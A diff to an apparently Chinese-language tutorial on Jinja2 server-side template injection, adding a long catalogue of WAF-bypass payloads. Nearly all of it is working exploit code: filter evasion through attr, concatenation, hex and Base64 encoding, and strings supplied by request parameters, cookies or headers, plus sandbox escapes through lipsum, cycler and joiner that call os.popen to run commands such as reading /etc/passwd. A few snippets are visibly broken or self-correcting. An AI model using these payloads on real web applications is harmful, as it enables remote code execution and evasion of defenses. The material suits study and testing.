@@ -228,47 +228,550 @@ Jinja2 在 Python 中运行，可以通过 Python 的对象模型链从任意对
 {{ joiner.__init__.__globals__.os.popen('id').read() }}
 ```
 
-### 3.5 过滤绕过
+### 3.5 过滤绕过（全场景详解）
 
-#### 过滤 `[` 和 `]` → 用 `.__getitem__()` 或 `|attr()`
+以下绕过方法按 WAF 拦截类型分类，绝大部分可以组合使用。
+
+---
+
+#### 场景一：过滤 `__`（双下划线）
+
+WAF 检测规则往往是匹配 `__class__`、`__builtins__` 这类双下划线开头的字符串。
+
+**方法 1：`|attr()` 过滤器替代属性访问**
+
+`|attr()` 是 Jinja2 内置过滤器，参数是字符串，不会在 AST 中产生 `Attribute` 节点：
 
 ```jinja2
-# 替代 []
-().__class__.__bases__[0]
-# 等价于
-().__class__.__bases__.__getitem__(0)
-
-# 或者使用 |attr() 过滤器
+# 原始: ''.__class__
+# 绕过:
 {{ ''|attr('__class__') }}
-```
-
-#### 过滤 `__` → 用 `|attr()` + 拼接
-
-```jinja2
-{{ ''|attr('__cl' + 'ass__') }}
 # 等价于 ''.__class__
-```
 
-#### 过滤 `class` → Unicode 编码
-
-```jinja2
-{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}
-# \x5f = _，等价于 __class__
-```
-
-#### 过滤 `{{` → 改用 `{%`
-
-某些场景下 `{{` 被过滤但 `{%` 可以：
-
-```jinja2
-{% if ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__.__builtins__.__import__('os').system('id') %}x{% endif %}
-```
-
-#### 过滤 `.` → 使用 `|attr()` 链
-
-```jinja2
+# 完整链:
 {{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
 ```
+
+**方法 2：字符串拼接拆解 `__`**
+
+```jinja2
+{{ ''|attr('_' + '_class_' + '_') }}
+
+# 或者拆成三块
+{{ ''|attr('__c' + 'lass__') }}
+{{ ''|attr('__cl' + 'ass__') }}
+{{ ''|attr('__cla' + 'ss__') }}
+```
+
+**方法 3：切片取值**
+
+```jinja2
+# 从已有字符串中切片拼出 __
+{% set a = '_' %}
+{% set b = a~a~'class'~a~a %}    {# ~ 是 Jinja2 的字符串连接符 #}
+{{ ''|attr(b) }}
+```
+
+**方法 4：利用 `dict` 的 `|join` 过滤器拼出下划线**
+
+```jinja2
+# 利用 dict 的 join 过滤器，指定连接符为空
+{% set x = (dict(a=1)|join) %}        # → 'a'（字典的 key 被 join 出来）
+# 但是我们需要下划线，可以用反转：
+{% set x = (dict(a=1)|join|string)[0] %}  # → 'a' 的第一字符，不是我们要的...
+
+# 更巧妙：利用 dict 本身
+{% set under = (dict(__=1)|join)[:1] %}   # → '_'（从 '__' 取第一个字符）
+{{ under }}                                # 输出 _
+
+# 然后用 under~under~'class'~under~under 拼出 __class__
+```
+
+**方法 5：使用 `lipsum`、`cycler`、`joiner` 等自带对象（不需要 `__`）**
+
+```jinja2
+# 这几个对象直接挂载在全局命名空间，不需要通过 __class__ 链
+{{ lipsum.__globals__['os'].popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+```
+
+这些对象的名字短，不包含 `__`，在某些 WAF 中比 `__class__` 链更容易过。
+
+---
+
+#### 场景二：过滤 `[` 和 `]`（中括号）
+
+WAF 拦截 `[]` 时，无法使用下标访问。有多种替代方案。
+
+**方法 1：`__getitem__()` 方法**
+
+```jinja2
+# 原始: obj[0]
+# 绕过:
+{{ obj.__getitem__(0) }}
+
+# 原始: obj['key']
+# 绕过:
+{{ obj.__getitem__('key') }}
+```
+
+**方法 2：配合 `|attr()` 访问字典键**
+
+```jinja2
+{{ obj|attr('__getitem__')('key') }}
+```
+
+**方法 3：`.pop()` 方法**
+
+```jinja2
+# pop 也能取指定键的值
+{{ obj.pop('key', None) }}
+```
+
+**方法 4：Jinja2 的 `.X` 属性访问（仅限字典键名合法的）**
+
+```jinja2
+# 如果 dict 中有 key 叫 'os'
+{{ obj.os }}
+# 等价于 obj['os']
+```
+
+这对变量名必须是合法 Python 标识符的情况有效。
+
+**方法 5：`|first` / `|last` 过滤器**
+
+```jinja2
+# 取列表第一个/最后一个元素
+{{ list_var|first }}
+{{ list_var|last }}
+```
+
+---
+
+#### 场景三：过滤 `.`（点号 / 属性访问符）
+
+有些 WAF 会拦截点符号，防止属性访问链。
+
+**方法 1：`|attr()` 完全替代点号**
+
+```jinja2
+# 原始: obj.attr1.attr2
+# 绕过:
+{{ obj|attr('attr1')|attr('attr2') }}
+
+# 完整逃逸链:
+{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
+```
+
+**方法 2：中括号替代（如果点号被禁但中括号没被禁）**
+
+```jinja2
+{{ obj['__class__']['__mro__'][1]['__subclasses__']() }}
+```
+
+**方法 3：组合使用**
+
+```jinja2
+{{ obj['__class__']|attr('__mro__')['__getitem__'](1) }}
+```
+
+---
+
+#### 场景四：过滤引号（`'` 和 `"`）
+
+复杂场景，WAF 不仅拦截属性名，还拦截所有字符串字面量。
+
+**方法 1：从请求参数中取字符串**
+
+```jinja2
+# Flask 环境下, request.args 直接可取 GET 参数
+{{ ''|attr(request.args.a) }}
+# 访问: ?a=__class__
+
+# 或
+{{ ''|attr(request.values.a) }}
+# 同时支持 GET/POST 参数
+```
+
+**方法 2：从 Cookie 中取字符串**
+
+```jinja2
+{{ ''|attr(request.cookies.a) }}
+# 设置 Cookie: a=__class__
+```
+
+**方法 3：从 `config` 对象中取预置字符串**
+
+```jinja2
+# 如果 config 中有 SECRET_KEY 等值
+# 可以利用切片从已知字符串中取出需要的字符
+{% set c = config.SECRET_KEY %}
+# 从 SECRET_KEY 中切片拼出目标字符串
+```
+
+**方法 4：利用 Jinja2 内置变量的字符串值**
+
+```jinja2
+# 利用 range 函数的字符串形式
+{% set r = range(1)|string %}       # → 'range(0, 1)'
+{% set under = r[0] %}              # → 'r'
+
+# 但从已有字符串中提取字符比较麻烦，需要找包含目标字符的源字符串
+
+# 另一种：利用 dict|join 产生的字符串
+{% set tmp = (dict(__builtins__=1)|join) %}  # → '__builtins__=1'
+{% set builtins_str = tmp[:11] %}            # → '__builtins__'
+```
+
+**方法 5：使用 `dict` 的 key 作为字符串载体**
+
+```jinja2
+# 在 Jinja2 中，dict 字面量的 key 不需要引号
+{{ ''|attr(dict(__class__=1)|join|first) }}
+# dict(__class__=1) → {'__class__': 1}
+# |join → '__class__=1'
+# |first → '_'（第一个字符）
+
+# 要取完整的 '__class__'：
+{% set cls = (dict(__class__=1)|join)[:11] %}
+{# 但 join 的结果是 '__class__=1'，长度 11 的只有 '__class__='... #}
+{# 更精确的方法：#}
+{% set cls = (dict(__class__=1)|join|replace('=1', '')) %}
+```
+
+**方法 6：`lipsum` 的直接调用（完全不需引号）**
+
+```jinja2
+# lipsum 对象本身就在全局，可直接调用 globals
+{{ lipsum.__globals__['os'].popen(request.args.cmd).read() }}
+# 访问: ?cmd=id
+```
+
+---
+
+#### 场景五：过滤 `{{`（双大括号）
+
+**方法 1：改用 `{%` 语句块**
+
+```jinja2
+{% if lipsum.__globals__['os'].popen('id').read() %}x{% endif %}
+```
+
+**方法 2：用 `{#` 注释块绕过（极少场景）**
+
+```jinja2
+{# 某些过滤只检查 {{，不检查 {% 或 {#
+```
+
+**方法 3：换行/空格绕过（针对正则匹配不严谨的 WAF）**
+
+```jinja2
+# WAF 正则: \{\{.+?\}\}
+# 绕过：在 {{ 中插入换行或空格
+{{ 7*7 }}
+{{
+7*7
+}}
+```
+
+---
+
+#### 场景六：过滤关键字（`class`、`mro`、`base`、`subclasses`、`builtins`、`globals`、`init` 等）
+
+**方法 1：字符串拼接**
+
+```jinja2
+{{ ''|attr('__cla' + 'ss__') }}
+{{ ''|attr('__' + 'class' + '__') }}
+```
+
+**方法 2：Unicode / Hex 编码**
+
+```jinja2
+# \x5f = _
+# \x63 = c
+{{ ''|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f') }}
+# 等价于 __class__
+
+# 完整 chained:
+{{ ''|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f')|attr('\x5f\x5f\x6d\x72\x6f\x5f\x5f')|attr('\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f')(1)|attr('\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f')() }}
+```
+
+**方法 3：Oct 八进制编码**
+
+```jinja2
+# 在 Jinja2 中，某些场景支持八进制
+```
+
+**方法 4：`|reverse` 过滤器反转字符串**
+
+```jinja2
+{% set cmd = 'ssalc__'|reverse %}   # → '__class__'
+{% set builtins = 's__'|reverse %}  # → '__s' ... 不太对
+
+# 更好：
+{% set target = 'ssalc__' %}         # 目标 __class__ 倒过来写
+{% set cmd = target|reverse %}       # → '__class__'
+{{ ''|attr(cmd) }}
+```
+
+**方法 5：`|replace` / `|trim` 过滤器变形**
+
+```jinja2
+{% set base = '__XclassX__'|replace('X', '') %}
+{{ ''|attr(base) }}
+
+# 或使用 trim
+{% set base = '  __class__  '|trim %}
+```
+
+**方法 6：`|lower` / `|upper` 转换**
+
+```jinja2
+# 如果 WAF 只拦截小写
+{% set cmd = '__CLASS__'|lower %}
+{{ ''|attr(cmd) }}
+```
+
+**方法 7：从环境变量/配置中读取字符串**
+
+```jinja2
+# 利用 config 对象中已有的值
+# config.SECRET_KEY 可能与 'SECRET' 有关
+# 可以从类似字符串中切片取字符
+
+# 假设有一条路径的字符串是已知的
+{% set p = self|string %}  # 得到当前模板的字符串表示
+# 从中提取需要的字符
+```
+
+**方法 8：利用 `lipsum` 绕过关键字检测（最强方案）**
+
+```jinja2
+# lipsum 不需要 __class__ 链，直接访问 __globals__
+# 原始链中需要: class, mro, subclasses, builtins 等
+# 绕过链只需要: lipsum, __globals__
+{{ lipsum.__globals__['os'].popen('id').read() }}
+
+# 如果 lipsum 也被过滤，用 cycler/joiner/range
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+```
+
+---
+
+#### 场景七：综合过滤（同时禁多个语法要素）
+
+实战中最常见的情况：WAF 同时拦截了 `__`、`.`、`[]`、`'`、多个关键字。
+
+**例 1：只禁 `__` 和 `'` 和 `"`**
+
+```jinja2
+# 利用 request.args 传字符串
+{{ lipsum|attr(request.args.a)|attr(request.args.b)|attr(request.args.c) }}
+# 访问: ?a=__globals__&b=os&c=popen&cmd=id
+
+# 最终效果：lipsum.__globals__['os'].popen('id')
+# 但 popen 需要参数，参数也可以用 request.args
+{{ lipsum|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(request.args.d) }}
+# 访问: ?a=__globals__&b=os&c=popen&d=cat+/etc/passwd
+```
+
+**例 2：全禁（`__`、`.`、`[]`、`'`、`"`、`class` 等全禁）**
+
+```jinja2
+# 最终方案：request.args 提供所有字符串
+
+# 第一段：构造 __class__ 链
+{{ ''|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(request.args.d|int)|attr(request.args.e)()|attr(request.args.f) }}
+# 访问参数：
+# ?a=__class__
+# &b=__mro__
+# &c=__getitem__
+# &d=1              (取 object)
+# &e=__subclasses__
+# &f=__getitem__
+
+# 但这只是一个元素，要遍历很麻烦
+
+# 更好的方案：直接用 lipsum
+{{ lipsum|attr(request.args.g)|attr(request.args.h)|attr(request.args.i)(request.args.j) }}
+# ?g=__globals__&h=os&i=popen&j=id
+```
+
+**例 3：极致绕过 — 参数全放 Cookie/Header**
+
+当 GET/POST 参数也被 WAF 拦截时，可以把 Payload 片段分散到不同位置：
+
+```jinja2
+# 从 Cookie 取
+{{ lipsum|attr(request.cookies.a) }}
+
+# 从 Header 取
+{{ lipsum|attr(request.headers.get('X-A')) }}
+```
+
+设置：
+
+```
+Cookie: a=__globals__
+X-A: popen
+```
+
+某些 WAF 只检查请求体和 URL 参数，不检查 Cookie 和自定义 Header。
+
+**例 4：多层编码绕过 WAF 正则**
+
+```jinja2
+# 第一层：Base64 解码
+{% set cmd = 'X19jbGFzc19f'|decode('base64') %}  # base64('__class__')
+{{ ''|attr(cmd) }}
+```
+
+---
+
+#### 场景八：利用 Jinja2 内置过滤器构造字符
+
+不使用任何字符串常量，完全从数字和函数返回值中构造出 Payload：
+
+```jinja2
+# 利用 range 和 join 输出字符
+{% set numbers = range(100) %}      # 0-99
+{% set chars = numbers|join %}      # "01234567891011..."
+{% set u95 = '_' %}                 # 不太好直接...
+
+# 利用 dict 构造
+{% set sl = dict(__=1)|join|first %}  # '_'（从 '__=1' 取第一个字符 '_'）
+
+# 实际组合：
+{% set u = (dict(__=1)|join)[:1] %}           # '_'
+{% set c = (dict(ca=1)|join)[:1] %}           # 'c'
+{% set l = (dict(lc=1)|join)[:1] %}           # 'l'
+{% set a = (dict(ab=1)|join)[:1] %}           # 'a'
+{% set s = (dict(ss=1)|join)[:1] %}           # 's'
+
+{% set class_str = u~u~c~a~l~s~s~u~u %}      # '__class__'
+{% set mro_str = u~u~('mro'|string)~u~u %}    # '__mro__'
+
+{{ ''|attr(class_str)|attr(mro_str) }}
+```
+
+---
+
+#### 场景九：绕过 `{{` 和 `{%` 都被过滤
+
+极少数 WAF 同时禁用了 `{{` 和 `{%`，但在 Flask 下还有一条路：
+
+```jinja2
+# 利用 template 表达式在 URL 中直接执行
+# 某些 Flask 配置允许在 URL 路径中嵌入模板表达式
+# URL: http://target.com/{{config}}
+```
+
+但这取决于具体的应用配置，不是通用方法。
+
+---
+
+#### 场景十：替换对象 — 不同的逃逸入口
+
+如果 `__class__`、`__mro__`、`__subclasses__` 全被封，但某个特定入口没被封：
+
+**10 个不同的逃逸入口：**
+
+```jinja2
+# 1. 空字符串
+{{ ''.__class__... }}
+
+# 2. 空列表
+{{ [].__class__... }}
+
+# 3. 空字典
+{{ {}.__class__... }}
+
+# 4. 空元组
+{{ ().__class__... }}
+
+# 5. 数字
+{{ 1..__class__... }}     # 注意第一个点号是小数点
+
+# 6. lipsum（全局函数）
+{{ lipsum.__globals__... }}
+
+# 7. cycler（全局对象）
+{{ cycler.__init__.__globals__... }}
+
+# 8. joiner
+{{ joiner.__init__.__globals__... }}
+
+# 9. namespace
+{{ namespace.__init__.__globals__... }}
+
+# 10. range
+{{ range.__class__... }}
+```
+
+---
+
+#### 场景十一：WAF 正则绕过技巧
+
+针对基于正则表达式的 WAF：
+
+**技巧 1：插入多余空格/换行**
+
+```jinja2
+# WAF 正则: \{\{.*?__class__.*?\}\}
+# 绕过:
+{{ ''|attr('__'  ~   'class__') }}
+# ~ 是 Jinja2 的字符串连接符
+
+# 或换行
+{{ ''|attr('__'
+    'class__') }}
+```
+
+**技巧 2：大小写混合（针对大小写敏感的正则）**
+
+```jinja2
+# 拦截 __class__ 但不拦截 __Class__
+# Jinja2 属性名大小写敏感，所以这个方法一般无效
+# 但过滤器名和某些特定场景可以用
+{{ ''|attr('__CLASS__'|lower) }}
+```
+
+**技巧 3：两次编码**
+
+```jinja2
+# 如果 WAF 只做一次 URL 解码
+# POST 时做二次 URL 编码
+```
+
+**技巧 4：分块提交**
+
+```jinja2
+# 将 Payload 分成多块在不同请求中
+# 第一次：?a=__globals__
+# 第二次：?a=__builtins__
+# 合并执行
+```
+
+---
+
+#### 绕过方法速查表
+
+| WAF 拦截点 | 绕过方法 | 示例 |
+|-----------|---------|------|
+| `__` | `|attr()`、字符串拼接、lipsum 替代 | `\|attr('__class__')` |
+| `.` | `|attr()`、`[]` | `\|attr('__class__')` |
+| `[]` | `__getitem__()`、`|first`、`.pop()` | `obj.__getitem__('key')` |
+| `'`/`"` | `request.args`、Cookie、dict key 无引号 | `\|attr(request.args.a)` |
+| `class`/`mro` 等 | 字符串拼接、Unicode 编码、`\x5f` | `'__cl'~'ass__'` |
+| `{{` | `{%` 语句块 | `{% if ... %}` |
+| `lipsum` / `cycler` | 切换其他入口 | `range.__class__` |
+| 多个同时拦截 | 组合使用 + request.args 全参数 | `\|attr(request.args.x)` |
+| 正则匹配 | 插入空格/换行/`~` 连接 | `'__'~'class__'` |
+| 参数检查 | Cookie/Header 外带 | `request.cookies.a` |
+
+---
 
 ### 3.6 常见 Flask SSTI 场景
 
